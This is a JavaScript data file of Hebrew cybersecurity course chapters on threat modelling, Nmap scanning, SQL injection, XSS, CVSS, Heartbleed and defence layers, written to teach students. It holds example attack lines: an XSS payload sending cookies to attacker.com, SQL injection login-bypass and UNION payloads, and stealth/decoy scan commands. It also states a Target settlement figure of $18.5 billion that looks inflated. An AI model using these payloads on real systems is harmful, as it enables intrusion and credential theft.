// Cybersecurity Learning Track — Hebrew Content
// Chapters 101-106 | Audience: Israeli CS students

const chapters = [
  // ─── Chapter 101: מודל האיום ──────────────────────────────────────────────
  {
    id: 101,
    title: "מודל האיום",
    pages: [
      {
        type: "explanation",
        title: "משולש ה-CIA — יסודות אבטחת מידע",
        content: `
<h2>משולש ה-CIA: הבסיס של כל אבטחת מידע</h2>
<p>כל מודל אבטחה מודרני מתחיל בשלושה עקרונות יסוד הידועים כ-<strong>CIA Triad</strong>. כל מתקפה שקיימת פוגעת באחד מהם, ולכל הגנה יש מטרה להגן על אחד מהם.</p>

<div class="diagram-container">
<svg viewBox="0 0 360 160" class="content-diagram" xmlns="http://www.w3.org/2000/svg">
  <rect width="360" height="160" fill="#1e293b" rx="8"/>
  <polygon points="180,15 60,140 300,140" fill="none" stroke="#ef4444" stroke-width="2.5"/>
  <text x="180" y="11" text-anchor="middle" fill="#ef4444" font-size="12" font-weight="bold">Confidentiality</text>
  <text x="180" y="23" text-anchor="middle" fill="#94a3b8" font-size="10">סודיות</text>
  <text x="25" y="155" text-anchor="middle" fill="#ef4444" font-size="12" font-weight="bold">Integrity</text>
  <text x="25" y="145" text-anchor="middle" fill="#94a3b8" font-size="10">שלמות</text>
  <text x="335" y="155" text-anchor="middle" fill="#ef4444" font-size="12" font-weight="bold">Availability</text>
  <text x="335" y="145" text-anchor="middle" fill="#94a3b8" font-size="10">זמינות</text>
  <text x="180" y="95" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="bold">CIA</text>
  <text x="180" y="112" text-anchor="middle" fill="#94a3b8" font-size="10">Triad</text>
  <circle cx="180" cy="15" r="4" fill="#ef4444"/>
  <circle cx="60" cy="140" r="4" fill="#ef4444"/>
  <circle cx="300" cy="140" r="4" fill="#ef4444"/>
</svg>
</div>

<table class="content-table">
  <tr><th>עיקרון</th><th>הגדרה</th><th>דוגמה לפגיעה</th><th>הגנה נפוצה</th></tr>
  <tr>
    <td><strong>Confidentiality</strong> (סודיות)</td>
    <td>מידע נגיש רק למורשים</td>
    <td>גניבת סיסמאות, data breach</td>
    <td>הצפנה, ACL, MFA</td>
  </tr>
  <tr>
    <td><strong>Integrity</strong> (שלמות)</td>
    <td>מידע לא שוּנה ללא אישור</td>
    <td>Tampering, SQL Injection</td>
    <td>Hash, digital signatures, checksums</td>
  </tr>
  <tr>
    <td><strong>Availability</strong> (זמינות)</td>
    <td>המערכת זמינה למשתמשים מורשים</td>
    <td>DDoS, Ransomware</td>
    <td>Redundancy, rate limiting, backups</td>
  </tr>
</table>

<p>חשוב להבין שלעיתים קיים <strong>מתח</strong> בין השלושה: הצפנה חזקה מגנה על סודיות אך עלולה לפגוע בזמינות. מדיניות אבטחה טובה מאזנת בין כולם.</p>

<p>כאשר בוחנים כל איום חדש, שאלו תמיד: על איזה צלע של המשולש הוא תוקף? Ransomware פוגע בזמינות ובסודיות. Phishing — בסודיות. Website defacement — בשלמות. הבנה זו מכוונת לבחירת ההגנה הנכונה.</p>`
      },
      {
        type: "explanation",
        title: "STRIDE — מודל מיפוי איומים",
        content: `
<h2>STRIDE: איך חושבים כמו תוקף</h2>
<p>פותח על ידי Microsoft בשנת 1999, מודל <strong>STRIDE</strong> נותן שפה אחידה לסיווג סוגי איומים. בכל Design Review של מערכת, עוברים על כל רכיב ושואלים: אילו מ-6 הסוגים רלוונטיים כאן?</p>

<table class="content-table">
  <tr><th>אות</th><th>סוג האיום</th><th>הגדרה</th><th>דוגמה</th><th>CIA שנפגע</th></tr>
  <tr>
    <td><strong>S</strong></td>
    <td>Spoofing (זיוף זהות)</td>
    <td>התחזות לישות אחרת</td>
    <td>ARP Spoofing, Email From: מזויף</td>
    <td>Confidentiality</td>
  </tr>
  <tr>
    <td><strong>T</strong></td>
    <td>Tampering (חבלה)</td>
    <td>שינוי נתונים ללא הרשאה</td>
    <td>SQL Injection, MITM שמשנה packets</td>
    <td>Integrity</td>
  </tr>
  <tr>
    <td><strong>R</strong></td>
    <td>Repudiation (הכחשה)</td>
    <td>הכחשת פעולות שבוצעו</td>
    <td>"לא אני שלחתי את ההוראה הזו"</td>
    <td>Integrity</td>
  </tr>
  <tr>
    <td><strong>I</strong></td>
    <td>Information Disclosure (חשיפת מידע)</td>
    <td>גישה למידע שאינו מיועד לך</td>
    <td>Directory traversal, verbose errors</td>
    <td>Confidentiality</td>
  </tr>
  <tr>
    <td><strong>D</strong></td>
    <td>Denial of Service (מניעת שירות)</td>
    <td>השבתת שירות לגיטימי</td>
    <td>DDoS, SYN flood, Slowloris</td>
    <td>Availability</td>
  </tr>
  <tr>
    <td><strong>E</strong></td>
    <td>Elevation of Privilege (הסלמת הרשאות)</td>
    <td>קבלת הרשאות מעל המותר</td>
    <td>sudo exploit, kernel vulnerability</td>
    <td>כולם</td>
  </tr>
</table>

<p><strong>Attack Surface</strong> (משטח תקיפה) הוא הסכום של כל נקודות הכניסה האפשריות למערכת: ports פתוחים, API endpoints, משתמשים, תוכנות צד שלישי. ככל שמשטח התקיפה קטן יותר — כך קל יותר להגן.</p>

<div class="code-preview"><pre><code># עקרון Least Privilege — הגנה על Elevation
# במקום:
app.run(user="root")  # מסוכן!

# עדיף:
app.run(user="www-data", capabilities=["NET_BIND_SERVICE"])

# Attack Surface Reduction:
# הסר שירותים שאינם בשימוש
sudo systemctl disable bluetooth telnet ftp
sudo ufw default deny incoming
sudo ufw allow 443/tcp  # רק HTTPS
</code></pre></div>

<p>בתהליך Threat Modeling נבנה <strong>Data Flow Diagram (DFD)</strong> של המערכת, מסמנים את ה-Trust Boundaries (גבולות האמון), ועל כל חץ שחוצה גבול שואלים את 6 שאלות STRIDE. זוהי שיטת עבודה שמשמשת צוותי אבטחה בכל חברת טכנולוגיה גדולה.</p>`
      },
      {
        type: "story",
        title: "סיפור: פריצת Target 2013 — 40 מיליון כרטיסי אשראי",
        content: `
<h2>Target 2013: כשהמזגן פרץ למאגר הנתונים</h2>

<p>נובמבר 2013. מיליוני אמריקאים עושים קניות לקראת Black Friday ב-Target, רשת הקניות הענקית. מה שהם לא ידעו — בכל פעם שחגרו כרטיס אשראי במסוף, פרטיהם נשלחו ישירות לשרתים של פושעים ברוסיה.</p>

<p>הפריצה לא התחילה ב-Target עצמה. היא התחילה בחברה קטנה ושקטה בשם <strong>Fazio Mechanical Services</strong> — קבלן שאחראי על מערכות חימום ומיזוג האוויר (HVAC) של Target. אחד מעובדי Fazio קיבל מייל phishing רגיל. הוא לחץ. Malware הותקן.</p>

<p>לקבלן היה גישה לפורטל אינטרנטי של Target — לא לרשת הפנימית, רק להגשת חשבוניות. אבל <strong>ה-network segmentation היה לקוי</strong>. מהפורטל, התוקפים הצליחו לנוע לרוחב הרשת עד שמצאו את השרתים שמנהלים את ה-POS (Point of Sale) במחשבי הקופה.</p>

<div class="code-preview"><pre><code>// שרשרת המתקפה — לפי STRIDE:

1. [Spoofing]        Phishing -- גניבת credentials של Fazio
2. [Elevation]       ניצול network misconfiguration לגישה לרשת Target
3. [Tampering]       התקנת RAM scraper malware על 1,800 מסופי POS
4. [Info Disclosure] גניבת track data מ-40M כרטיסים
5. [Repudiation]     הנתונים הוצאו דרך FTP לשרתים חיצוניים
</code></pre></div>

<p>ה-malware שנקרא <strong>BlackPOS</strong> פעל בזיכרון RAM של מסופי הקופה — בדיוק ברגע שהנתונים נמצאים שם לא מוצפנים (בין קריאת הכרטיס לשליחה לעיבוד). זה נקרא <strong>RAM scraping attack</strong>.</p>

<p>FireEye, שהגן על Target, <strong>הוציא התראות אוטומטיות</strong> — אבל הן הוגדרו לא לבצע פעולה אוטומטית. הצוות בבנגלור שאמור היה לעקוב — לא פעל. ה-SIEM ראה, אבל אף אחד לא הקשיב.</p>

<p><strong>הנזק:</strong> 40 מיליון כרטיסי אשראי ו-70 מיליון רשומות אישיות נגנבו. Target שילמה <strong>$18.5 מיליארד</strong> בהסדרי פיצויים. המנכ"ל התפטר. ה-CISO התפטר.</p>

<p><strong>הלקח:</strong> Third-party vendors הם נקודת כשל קריטית. Network segmentation הכרחי — vendor access לא צריך להגיע לשרתי ייצור. ו-SIEM ללא אנשים שמגיבים להתראות — הוא חסר ערך.</p>`
      }
    ]
  },

  // ─── Chapter 102: סריקה וגילוי ───────────────────────────────────────────
  {
    id: 102,
    title: "סריקה וגילוי",
    pages: [
      {
        type: "explanation",
        title: "סוגי סריקות רשת — Nmap ומה שמאחוריו",
        content: `
<h2>סריקת רשת: הצעד הראשון של כל Penetration Test</h2>
<p>לפני שתוקף (או בודק חדירה מורשה) יכול לנצל פגיעות, עליו לדעת מה קיים. שלב <strong>Reconnaissance</strong> ו-<strong>Scanning</strong> הוא מיפוי המטרה — אילו hosts פעילים, אילו ports פתוחים, אילו שירותים רצים ובאיזה גרסה.</p>

<table class="content-table">
  <tr><th>סוג סריקה</th><th>שם טכני</th><th>איך עובד</th><th>יתרון</th><th>חיסרון</th></tr>
  <tr>
    <td>SYN Scan</td>
    <td>Half-open / Stealth</td>
    <td>שולח SYN, מקבל SYN-ACK, שולח RST (לא מסיים handshake)</td>
    <td>מהיר, פחות רישום ב-logs</td>
    <td>דורש root/admin</td>
  </tr>
  <tr>
    <td>TCP Connect</td>
    <td>Full connect scan</td>
    <td>מסיים TCP handshake מלא</td>
    <td>עובד ללא הרשאות מיוחדות</td>
    <td>נרשם ב-logs של המטרה</td>
  </tr>
  <tr>
    <td>UDP Scan</td>
    <td>UDP probe</td>
    <td>שולח UDP packet, מחכה ל-ICMP "port unreachable"</td>
    <td>מגלה שירותי UDP (DNS, SNMP)</td>
    <td>איטי מאוד, לא אמין</td>
  </tr>
  <tr>
    <td>Version Detection</td>
    <td>Service fingerprinting</td>
    <td>שולח probes ומנתח banner responses</td>
    <td>חושף גרסת תוכנה מדויקת</td>
    <td>יכול לגרום לקריסת שירות</td>
  </tr>
  <tr>
    <td>OS Detection</td>
    <td>TCP/IP fingerprinting</td>
    <td>מנתח TTL, window size, TCP options</td>
    <td>יודע אם Windows/Linux/BSD</td>
    <td>לא מדויק תמיד</td>
  </tr>
</table>

<p>הבסיס הטכני: כאשר port <strong>סגור</strong> — השרת מחזיר RST. כאשר <strong>פתוח</strong> — מחזיר SYN-ACK. כאשר <strong>מסונן</strong> (Firewall) — אין תגובה כלל. Nmap מנתח את ההבדלים האלה ובונה תמונה של הרשת.</p>

<p><strong>חשוב מבחינה משפטית:</strong> סריקת רשת ללא אישור היא עבירה פלילית. אפילו סריקת שרת של חברה שאת עובד בה — צריך אישור מפורש בכתב.</p>`
      },
      {
        type: "explanation",
        title: "Nmap — הדגלים החשובים",
        content: `
<h2>Nmap: Swiss Army Knife של סריקת רשת</h2>
<p><strong>Nmap (Network Mapper)</strong> הוא הכלי הסטנדרטי לסריקת רשת בעולם. נכתב ב-1997 על ידי Gordon Lyon ועדיין הכי נפוץ. הוא משמש גם מנהלי רשת לגיטימיים וגם בודקי חדירה.</p>

<div class="code-preview"><pre><code># סריקות בסיסיות
nmap 192.168.1.1              # סריקת 1000 ports נפוצים
nmap 192.168.1.0/24           # סריקת כל ה-subnet
nmap -p 80,443,8080 target    # ports ספציפיים
nmap -p- target               # כל 65,535 ports (איטי!)

# זיהוי שירותים וגרסאות
nmap -sV target               # Service/Version detection
nmap -O target                # OS fingerprinting (דורש root)
nmap -A target                # הכל: -sV -O --script=default + traceroute

# סריקות Stealth
nmap -sS target               # SYN scan (דורש root)
nmap -T2 target               # Slower timing (פחות רעש)
nmap -D RND:10 target         # Decoy scan — מסתיר את ה-IP שלך

# NSE Scripts (Nmap Scripting Engine)
nmap --script vuln target             # בדיקת פגיעויות ידועות
nmap --script http-title target       # כותרות HTTP
nmap --script smb-enum-shares target  # SMB shares
nmap --script ssl-cert -p 443 target  # פרטי SSL certificate

# Output
nmap -oN scan.txt target      # שמירה כ-text
nmap -oX scan.xml target      # שמירה כ-XML
nmap -oG scan.gnmap target    # Grepable format
</code></pre></div>

<table class="content-table">
  <tr><th>דגל</th><th>מה עושה</th><th>מתי להשתמש</th></tr>
  <tr><td>-sS</td><td>SYN (stealth) scan</td><td>סריקה ראשונית, מהירה ושקטה</td></tr>
  <tr><td>-sV</td><td>גרסת שירותים</td><td>לאחר זיהוי ports פתוחים</td></tr>
  <tr><td>-O</td><td>זיהוי מערכת הפעלה</td><td>לתכנון ניצול ספציפי ל-OS</td></tr>
  <tr><td>-A</td><td>Aggressive — הכל</td><td>בסביבת lab, לא ב-production</td></tr>
  <tr><td>-p-</td><td>כל ה-ports</td><td>כשרוצים לוודא שאין ports נסתרים</td></tr>
  <tr><td>--script</td><td>NSE scripts</td><td>בדיקות ספציפיות (vuln, auth, enum)</td></tr>
  <tr><td>-T0 עד -T5</td><td>מהירות סריקה</td><td>T1-2 לslow stealth, T4 למהירות</td></tr>
</table>

<p>תוצאת סריקה טיפוסית תראה: <code>22/tcp open ssh OpenSSH 8.2p1</code> — port 22, פרוטוקול TCP, פתוח, שירות SSH, גרסה 8.2p1. עכשיו אפשר לחפש ב-CVE database אם יש פגיעויות ידועות לגרסה הזו.</p>`
      },
      {
        type: "story",
        title: "סיפור: הפורט שנשכח — RDP בלב הארגון",
        content: `
<h2>הפורט שאף אחד לא זכר שהוא שם</h2>

<p>יובל קיבל את המשימה ביום שני בבוקר: Penetration Test מלא על חברת ייצור בינונית בצפון הארץ. החוזה חתום, הסמכות נתונות. 5 ימים לסרוק, לפרוץ, לתעד.</p>

<p>הוא התחיל כמו תמיד — שלב ה-reconnaissance מ-outside. OSINT: האתר, LinkedIn, Shodan, Censys. חברה של 200 עובדים, אתר ישן, שרת-מייל שמוצג public.</p>

<p>ביום הראשון הריץ סריקה רחבה מ-IP חיצוני:</p>

<div class="code-preview"><pre><code>nmap -sS -sV -p- --open -T3 -oN external_scan.txt 82.xx.xx.xx/27

# תוצאות מעניינות:
PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Apache 2.4.41
443/tcp   open   https         Apache 2.4.41
25/tcp    open   smtp          Postfix 3.4.13
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
8443/tcp  open   https-alt     ?
</code></pre></div>

<p>יובל עצר. <strong>Port 3389 — RDP — פתוח לאינטרנט.</strong> זה לא היה בתיעוד שקיבל. הוא שלח הודעה ל-CISO: "ידעתם על 3389?" התשובה הגיעה אחרי 20 דקות: "לא. מה זה?"</p>

<p>עוד בדיקה הוכיחה שמדובר בשרת Windows Server 2008 R2 — <strong>EOL מאז ינואר 2020</strong>. שרת ישן, מחובר ישירות לאינטרנט, עם RDP חשוף. כל מה שנדרש הוא credentials נכונים — או ניצול של אחת הפגיעויות הידועות רבות לגרסה הזו.</p>

<div class="code-preview"><pre><code># OS fingerprint הוכיח:
nmap -O --osscan-guess 82.xx.xx.xx -p 3389

OS details: Microsoft Windows Server 2008 R2 SP1
# CVE-2019-0708 -- BlueKeep: RCE ללא authentication!
# CVE-2017-0144 -- EternalBlue: (WannaCry)
# שתיהן רלוונטיות לגרסה זו
</code></pre></div>

<p>ממשיך לחקור, יובל מריץ <code>nmap --script smb-vuln-ms17-010</code> — ומקבל תוצאה ירוקה: <strong>VULNERABLE</strong>. השרת חשוף ל-EternalBlue, אותה פגיעות שהפעילה את WannaCry ב-2017.</p>

<p>הסתבר שהשרת הותקן לפני 8 שנים כדי שאדם טכני יוכל להתחבר מהבית בתקופת קורונה. הוא סיים את עבודתו ועזב את החברה — אבל איש לא כיבה את ה-RDP.</p>

<p>הדוח הסופי של יובל כלל: "נקודת כניסה קריטית — RDP חשוף עם OS EOL ופגיעות EternalBlue. מחובר לרשת הפנימית ללא segmentation. <strong>תוקף חיצוני יכול להשתלט על כל הרשת תוך דקות.</strong>"</p>

<p><strong>הלקח:</strong> Asset inventory הוא בסיס. אם אינך יודע מה מחובר לאינטרנט — אתה לא יכול להגן עליו. סריקות Nmap תקופתיות מ-outside הן חובה בכל ארגון.</p>`
      }
    ]
  },

  // ─── Chapter 103: ניצול פגיעויות ─────────────────────────────────────────
  {
    id: 103,
    title: "ניצול פגיעויות",
    pages: [
      {
        type: "explanation",
        title: "SQL Injection — הפגיעות שלא מתה",
        content: `
<h2>SQL Injection: כשהמשתמש כותב את השאילתות שלך</h2>
<p>SQL Injection (SQLi) היא אחת הפגיעויות הוותיקות ביותר — קיימת מאז 1998 — ועדיין מדורגת ב-OWASP Top 10. הסיבה: קוד פגיע קל לכתוב, ההשפעה הרסנית.</p>

<p>הרעיון פשוט: אם אפליקציה בונה שאילתת SQL על ידי שרשור מחרוזות עם קלט משתמש, תוקף יכול "לשבור" מהמחרוזת ולהוסיף לוגיקת SQL משלו.</p>

<div class="code-preview"><pre><code>-- קוד פגיע (Python + MySQL)
username = request.form['username']
password = request.form['password']
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"

-- תוקף מכניס כ-username:
admin' --

-- השאילתה שנוצרת:
SELECT * FROM users WHERE username='admin' --' AND password='anything'
-- הכל אחרי -- הוא comment! בדיקת הסיסמה נעלמת.

-- פגיעות חמורה יותר — UNION-based:
-- username: ' UNION SELECT username, password, 3 FROM users --
SELECT * FROM users WHERE username='' UNION SELECT username, password, 3 FROM users --'
-- חושף את כל שמות המשתמש והסיסמאות!
</code></pre></div>

<div class="code-preview"><pre><code>-- קוד מאובטח — Parameterized Queries (חובה!)
# Python + mysql-connector:
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)

# ORM (SQLAlchemy):
user = db.session.query(User).filter_by(username=username, password=password).first()

# הפרמטרים מועברים בנפרד — לא כחלק מהשאילתה.
# מנוע ה-DB מטפל בהם כנתונים בלבד, לא כקוד.
</code></pre></div>

<table class="content-table">
  <tr><th>סוג SQLi</th><th>איך עובד</th><th>מתי</th></tr>
  <tr>
    <td>Classic / In-band</td>
    <td>תוצאת ה-SQL מוחזרת ישירות בתגובת HTTP</td>
    <td>שדה חיפוש, דף שגיאה verbose</td>
  </tr>
  <tr>
    <td>Blind — Boolean</td>
    <td>שואל TRUE/FALSE, מסיק מידע מ-behavior</td>
    <td>כשאין הודעות שגיאה</td>
  </tr>
  <tr>
    <td>Blind — Time-based</td>
    <td>SLEEP(5) — אם מאחר 5 שניות, התנאי נכון</td>
    <td>כשאין פידבק כלל</td>
  </tr>
  <tr>
    <td>Out-of-band</td>
    <td>DNS/HTTP request לשרת חיצוני עם הנתונים</td>
    <td>WAF עוצר in-band</td>
  </tr>
</table>

<p>כלים נפוצים: <strong>sqlmap</strong> — אוטומטי, מגלה ומנצל SQLi. <strong>Burp Suite</strong> — proxy ידני לניסויים. גם ללא כלים, ניסיון של <code>'</code> בשדה קלט ובדיקה אם יש שגיאת SQL בתגובה — זה הצעד הראשון.</p>`
      },
      {
        type: "explanation",
        title: "XSS — כשהדפדפן מריץ קוד של תוקף",
        content: `
<h2>Cross-Site Scripting (XSS): הזרקת JavaScript לדפדפן הקורבן</h2>
<p>XSS מאפשר לתוקף להריץ JavaScript בדפדפן של משתמש אחר. זה אומר: גניבת cookies, keylogging, redirect לפישינג, השתלטות מלאה על session.</p>

<table class="content-table">
  <tr><th>סוג</th><th>איך עובד</th><th>דוגמה</th><th>קשה לזיהוי?</th></tr>
  <tr>
    <td><strong>Reflected</strong></td>
    <td>payload בURL, מוחזר מהשרת לאותו בקשה</td>
    <td>search?q=&lt;script&gt;...&lt;/script&gt;</td>
    <td>לא — חייב ללחוץ על link</td>
  </tr>
  <tr>
    <td><strong>Stored</strong></td>
    <td>payload נשמר ב-DB, מוצג לכל משתמש שפותח הדף</td>
    <td>תגובה בפורום עם script</td>
    <td>כן — persistent, מדביק עצמאית</td>
  </tr>
  <tr>
    <td><strong>DOM-based</strong></td>
    <td>JavaScript בצד לקוח כותב input לDOM ללא sanitization</td>
    <td>location.hash -&gt; innerHTML</td>
    <td>מאוד — לא עובר דרך שרת</td>
  </tr>
</table>

<div class="code-preview"><pre><code>// דוגמה Stored XSS — פגיעה:
// משתמש שולח תגובה לפורום:
// &lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie);&lt;/script&gt;
// כל מי שיראה את התגובה — העביר את ה-cookie לתוקף

// הגנה — Output Encoding:
// ב-Python/Jinja2:
{{ user_input | e }}          // escapes HTML automatically

// ב-JavaScript:
element.textContent = userInput;  // בטוח
element.innerHTML = userInput;    // מסוכן!

// CSP — Content Security Policy (header):
// Content-Security-Policy: default-src 'self'; script-src 'self'
// מונע טעינת scripts ממקורות חיצוניים

// HTTPOnly Cookie — מונע גישה מ-JavaScript:
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
</code></pre></div>

<p>XSS מדורג #3 ב-OWASP Top 10 2021 (תחת "Injection"). כלי בדיקה: <strong>XSStrike</strong>, <strong>Dalfox</strong>. בדיקה ידנית: הכנס <code>&lt;img src=x onerror=alert(1)&gt;</code> בכל שדה קלט.</p>

<p><strong>Self-XSS</strong> הוא תרגיל פישינג נפוץ: "פתח DevTools והדבק את הקוד הזה כדי לקבל את הפרס שלך" — ואז הקורבן מריץ בעצמו קוד זדוני בחשבון שלו.</p>`
      },
      {
        type: "explanation",
        title: "CVSS — איך מודדים חומרת פגיעות",
        content: `
<h2>CVE ו-CVSS: שפה אחידה לפגיעויות</h2>
<p><strong>CVE (Common Vulnerabilities and Exposures)</strong> — מזהה ייחודי לכל פגיעות שהתגלתה. דוגמה: CVE-2021-44228 הוא Log4Shell. ה-NVD (National Vulnerability Database) של NIST מנהל את המאגר.</p>

<p><strong>CVSS (Common Vulnerability Scoring System)</strong> גרסה 3.1 — ציון 0-10 שמסכם את חומרת הפגיעות. מחושב מ-8 מדדים:</p>

<table class="content-table">
  <tr><th>קטגוריה</th><th>מדד</th><th>ערכים אפשריים</th></tr>
  <tr>
    <td rowspan="4"><strong>Base Score</strong></td>
    <td>Attack Vector (AV)</td>
    <td>Network / Adjacent / Local / Physical</td>
  </tr>
  <tr>
    <td>Attack Complexity (AC)</td>
    <td>Low / High</td>
  </tr>
  <tr>
    <td>Privileges Required (PR)</td>
    <td>None / Low / High</td>
  </tr>
  <tr>
    <td>User Interaction (UI)</td>
    <td>None / Required</td>
  </tr>
  <tr>
    <td rowspan="3"><strong>Impact</strong></td>
    <td>Confidentiality Impact</td>
    <td>None / Low / High</td>
  </tr>
  <tr>
    <td>Integrity Impact</td>
    <td>None / Low / High</td>
  </tr>
  <tr>
    <td>Availability Impact</td>
    <td>None / Low / High</td>
  </tr>
</table>

<table class="content-table">
  <tr><th>טווח ציון</th><th>רמת חומרה</th><th>דוגמה</th></tr>
  <tr><td>0.0</td><td>None</td><td>—</td></tr>
  <tr><td>0.1 – 3.9</td><td>Low</td><td>Information disclosure קטנה</td></tr>
  <tr><td>4.0 – 6.9</td><td>Medium</td><td>XSS Reflected</td></tr>
  <tr><td>7.0 – 8.9</td><td>High</td><td>SQL Injection עם data exfiltration</td></tr>
  <tr><td>9.0 – 10.0</td><td>Critical</td><td>Log4Shell (10.0), BlueKeep (9.8)</td></tr>
</table>

<div class="code-preview"><pre><code># חיפוש CVEs ב-command line:
# כלי: searchsploit (חלק מ-Kali Linux)
searchsploit apache 2.4.41
searchsploit openssh 8.2

# API של NVD:
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=log4j"
</code></pre></div>

<p>בעולם האמיתי, CVSS Base Score הוא נקודת התחלה בלבד. גם <strong>Exploitability</strong> (האם יש exploit public?) ו-<strong>Context</strong> (האם השרת הפגיע חשוף לאינטרנט?) קובעים את הפריוריטי האמיתי לתיקון.</p>`
      },
      {
        type: "story",
        title: "סיפור: Heartbleed 2014 — הבאג שגנב חצי מהאינטרנט",
        content: `
<h2>Heartbleed: כשלב ה-SSL נשבר</h2>

<p>אפריל 2014. חוקר אבטחה של Google בשם Neel Mehta שולח מייל מוצפן לצוות OpenSSL. הנושא: "תיקון קריטי דחוף". כשהפרטים התפרסמו ב-7 באפריל, העולם הבין שמשהו חסר תקדים קרה.</p>

<p>OpenSSL — ספריית ההצפנה שמפעילה HTTPS עבור מעל 60% מהאינטרנט — <strong>הכילה באג במשך שנתיים שאפשר לתוקף לקרוא זיכרון שרת מרוחק.</strong> CVE-2014-0160, CVSS 7.5. שמה: Heartbleed.</p>

<p>הבאג היה בהרחבת <strong>TLS Heartbeat</strong> — מנגנון שמאפשר לצד אחד לשלוח "אתה שם?" ולצד השני לענות עם אותו payload. הקוד ב-OpenSSL לא אימת שהאורך שהמשתמש הצהיר עליו תואם לאורך האמיתי:</p>

<div class="code-preview"><pre><code>// לוגיקה פגיעה (מפושטת):
void process_heartbeat(TLS_connection *conn, uint8_t *payload, uint16_t payload_length) {
    uint8_t *response = malloc(payload_length);  // מקצה לפי מה שהלקוח אמר
    memcpy(response, payload, payload_length);    // מעתיק payload_length bytes
    // PROBLEM: payload_length יכול להיות 65535 אבל payload האמיתי רק 1 byte
    // memcpy ממשיך לקרוא 65534 bytes מהזיכרון הסמוך!
    send(conn, response, payload_length);
}

// תוקף שולח:
// payload: "A" (1 byte)
// payload_length: 65535

// התגובה מכילה את 1 ה-byte שלו + 65534 bytes מהזיכרון של השרת:
// private keys, session tokens, passwords, כל מה שהיה בזיכרון!
</code></pre></div>

<p>Yahoo, AWS, GitHub, Tumblr — כולם פגיעים. חוקרים הדגימו גניבת private key של שרת Yahoo בשידור חי. ה-NSA — לפי דיווחים מאוחרים — ידעה על הבאג שנתיים ולא גילתה אותו.</p>

<p>התיקון היה שורת קוד אחת: <code>if (payload_length &gt; len) return 0;</code>. בדיקת bounds פשוטה. שנתיים של שכחה לכתוב אותה — עלתה בגניבת מיליוני credentials.</p>

<p><strong>הלקח:</strong> Buffer over-read attacks קריטיים לא פחות מoverflow. ספריות צד-שלישי כמו OpenSSL הן חלק מה-attack surface שלך. Audit קוד קריטי הוא השקעה, לא הוצאה.</p>`
      }
    ]
  },

  // ─── Chapter 104: הגנה ו-Blue Team ───────────────────────────────────────
  {
    id: 104,
    title: "הגנה ו-Blue Team",
    pages: [
      {
        type: "explanation",
        title: "Defense in Depth — שכבות ההגנה",
        content: `
<h2>Defense in Depth: ההגנה שלא מסתמכת על שכבה אחת</h2>
<p>עיקרון Defense in Depth (הגנה לעומק) אומר: אל תסמוך על שכבת הגנה אחת. בנה מספר שכבות, כך שתוקף שיצליח לפרוץ שכבה אחת — עדיין עומד בפני השכבה הבאה.</p>

<div class="diagram-container">
<svg viewBox="0 0 360 160" class="content-diagram" xmlns="http://www.w3.org/2000/svg">
  <rect width="360" height="160" fill="#1e293b" rx="8"/>
  <ellipse cx="180" cy="80" rx="170" ry="70" fill="none" stroke="#334155" stroke-width="18" opacity="0.9"/>
  <ellipse cx="180" cy="80" rx="135" ry="55" fill="none" stroke="#ef4444" stroke-width="16" opacity="0.7"/>
  <ellipse cx="180" cy="80" rx="100" ry="40" fill="none" stroke="#f97316" stroke-width="14" opacity="0.7"/>
  <ellipse cx="180" cy="80" rx="68" ry="27" fill="none" stroke="#eab308" stroke-width="12" opacity="0.7"/>
  <ellipse cx="180" cy="80" rx="38" ry="14" fill="#1e40af" stroke="#3b82f6" stroke-width="2"/>
  <text x="348" y="25" text-anchor="end" fill="#94a3b8" font-size="9">Perimeter: Firewall, WAF</text>
  <text x="348" y="48" text-anchor="end" fill="#ef4444" font-size="9">Network: IDS/IPS, Segmentation</text>
  <text x="348" y="71" text-anchor="end" fill="#f97316" font-size="9">Host: EDR, Hardening, Patch</text>
  <text x="348" y="94" text-anchor="end" fill="#eab308" font-size="9">App: Auth, Input validation</text>
  <text x="180" y="84" text-anchor="middle" fill="#e2e8f0" font-size="8" font-weight="bold">Data</text>
</svg>
</div>

<table class="content-table">
  <tr><th>שכבה</th><th>כלים נפוצים</th><th>מה מגינה</th></tr>
  <tr>
    <td>Perimeter</td>
    <td>Firewall, WAF, DDoS protection</td>
    <td>חסימת תעבורה חיצונית זדונית</td>
  </tr>
  <tr>
    <td>Network</td>
    <td>IDS/IPS, Network segmentation, VLANs</td>
    <td>זיהוי תנועה חריגה, הגבלת lateral movement</td>
  </tr>
  <tr>
    <td>Host</td>
    <td>EDR (CrowdStrike, SentinelOne), patch management</td>
    <td>זיהוי malware, ניצול OS</td>
  </tr>
  <tr>
    <td>Application</td>
    <td>Authentication, input validation, SAST/DAST</td>
    <td>SQLi, XSS, auth bypass</td>
  </tr>
  <tr>
    <td>Data</td>
    <td>Encryption at rest, DLP, backup</td>
    <td>גניבת נתונים, ransomware</td>
  </tr>
</table>

<p>בנוסף לשכבות טכניות, <strong>Least Privilege</strong> (הרשאות מינימליות הכרחיות), <strong>Zero Trust</strong> (אל תאמין לאף אחד — גם ברשת הפנימית), ו-<strong>MFA</strong> הם עמודי תווך של ארכיטקטורת אבטחה מודרנית.</p>`
      },
      {
        type: "explanation",
        title: "SIEM — עיניים על כל הרשת",
        content: `
<h2>SIEM: Security Information and Event Management</h2>
<p>SIEM הוא הלב של ה-SOC (Security Operations Center). הוא אוסף logs מכל מקור אפשרי, מנרמל אותם לפורמט אחיד, ומפעיל correlation rules כדי לגלות דפוסי תקיפה שאף מערכת בודדת לא תראה לבד.</p>

<table class="content-table">
  <tr><th>מקור Log</th><th>מה מספק</th><th>חשיבות</th></tr>
  <tr><td>Firewall</td><td>תעבורה נכנסת/יוצאת, חסימות</td><td>גבוהה</td></tr>
  <tr><td>Active Directory</td><td>כניסות, שינויי הרשאות, account lockouts</td><td>קריטית</td></tr>
  <tr><td>Web Server</td><td>HTTP requests, errors, user-agents</td><td>גבוהה</td></tr>
  <tr><td>EDR / Antivirus</td><td>malware detection, process creation</td><td>קריטית</td></tr>
  <tr><td>DNS</td><td>queries לדומיינים, תשובות — DGA detection</td><td>גבוהה</td></tr>
